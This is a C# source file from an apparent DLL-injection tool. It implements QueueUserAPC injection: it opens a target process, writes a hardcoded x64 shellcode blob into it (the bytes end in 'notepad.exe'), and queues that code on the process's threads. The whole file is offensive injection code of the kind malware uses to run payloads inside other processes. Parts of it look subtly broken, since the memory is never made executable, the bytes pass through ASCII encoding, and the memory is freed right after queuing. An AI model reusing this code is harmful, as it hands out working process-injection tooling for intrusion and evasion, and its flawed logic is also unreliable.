using System;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;

using YADI.Externals;


namespace YADI.Injection
{
    class QueueUserAPC : Injectors.Base
    {
        private int pid;

        public QueueUserAPC(int pid)
        {
            this.pid = pid;
        }

        public override bool Inject(String dllPath)
        {
            IntPtr procHandle = Kernel32.OpenProcess(Externals.Kernel32.PROCESS_INJECT, false, (uint)this.pid);

            if (procHandle == null)
            {
                MessageBox.Show("Couldn't get a handle on PID " + this.pid + "...");
                return false;
            }

            // Read DLL into a byte array so we know how much memory to VA.
            // byte[] dllBytes = File.ReadAllBytes(dllPath);


            String dllBytes = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"  +
                                "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48" +
                                "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9" +
                                "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41" +
                                "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48" +
                                "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01" +
                                "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48" +
                                "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0" +
                                "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c" +
                                "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0" +
                                "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04" +
                                "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59" +
                                "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48" +
                                "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" +
                                "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f" +
                                "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff" +
                                "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" +
                                "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74" +
                                "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

            // Allocate memory for DLL bytes
            IntPtr writeAddr = Kernel32.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)dllBytes.Length, Kernel32.MEM_RESERVE | Kernel32.MEM_COMMIT, Kernel32.PAGE_READWRITE);

            if (writeAddr == IntPtr.Zero ||  writeAddr == null)
            {
                MessageBox.Show("VirtualAllocEx() was unsuccessful");
                return false;
            }

            UIntPtr bytesWritten = UIntPtr.Zero;

            // Write to memory
            if (!Kernel32.WriteProcessMemory(procHandle, writeAddr, Encoding.ASCII.GetBytes(dllBytes), (uint)dllBytes.Length, out bytesWritten))
            {
                MessageBox.Show("Failed to write to process memory...");
                Kernel32.CloseHandle(procHandle);
                return false;
            }

            UIntPtr oldProtect = UIntPtr.Zero;

            // Modify memory permissions on VA memory
            if (!Kernel32.VirtualProtectEx(procHandle, writeAddr, (uint)dllBytes.Length, Kernel32.PAGE_READWRITE, out oldProtect)) {
                MessageBox.Show("Failed to modify permissions on VA memory...");
                Kernel32.CloseHandle(procHandle);
                return false;
            }

            Process process = Process.GetProcessById(this.pid);
            bool queued = false;

            // Iterate through process' threads and attempt to queueuserapc on each
            // until we find one.
            for (int i = 0; i < process.Threads.Count; i++)
            {
                int threadId = process.Threads[i].Id;
#if DEBUG
                Console.WriteLine("Checking thread " + i + " of " + (process.Threads.Count - 1));
                Console.WriteLine("\tThread ID: " + threadId);
#endif
                // Get a thread handle that we can pass in the following Kernel32 calls
                IntPtr threadHandle = Kernel32.OpenThread(Kernel32.ThreadAccess.SET_CONTEXT, false, (uint)threadId);

                // If we don't get a handle back on the thread
                if (threadHandle == null || threadHandle == IntPtr.Zero)
                {
#if DEBUG
                    Console.WriteLine("Couldn't open handle to thread (ID: " + threadId + ")");
#endif
                    // Try the next thread
                    continue;
                }

#if DEBUG
                Console.WriteLine("Got thread handle: " + threadHandle + "\nAttempting to suspend thread");
#endif

                // Suspend the thread so we can QueueUserAPC
                int pSuspendedThreadStatus = Kernel32.SuspendThread(threadHandle);

                if (pSuspendedThreadStatus == -1)
                {
#if DEBUG
                    Console.Write("SuspendThread failed (thread id: " + threadId + ")...");
#endif
                    // Close the handle on the current thread
                    Kernel32.CloseHandle(threadHandle);

                    // Try the next thread
                    continue;
                }

                // QueueUserAPC
                if (Kernel32.QueueUserAPC(writeAddr, threadHandle, IntPtr.Zero) != 0)
                {
#if DEBUG
                    Console.WriteLine("QueueUserAPC was unsuccessful");
#endif
                    // ResumeThread
                    Kernel32.ResumeThread(threadHandle);

                    // Close thread handle
                    Kernel32.CloseHandle(threadHandle);

                    continue;
                }

                queued = true;

                // ResumeThread
                Kernel32.ResumeThread(threadHandle);

                // Close thread handle
                Kernel32.CloseHandle(threadHandle);
            }

            if (!queued)
            {
                MessageBox.Show("QueueUserAPC injection failed");
            }

            // Free our VA'd memory
            if (!Kernel32.VirtualFreeEx(procHandle, writeAddr, 0, Kernel32.MEM_RELEASE))
            {
#if DEBUG
                Console.WriteLine("VirtualFreeEx() failed!");
#endif
                // Close process handle before returning
                Kernel32.CloseHandle(procHandle);

                return false;
            }

#if DEBUG
            Console.WriteLine("Successfully free'd VA memory");
#endif

            // Close process handle before returning
            Kernel32.CloseHandle(procHandle);
            process.Close();

            return true;
        }
    }
}
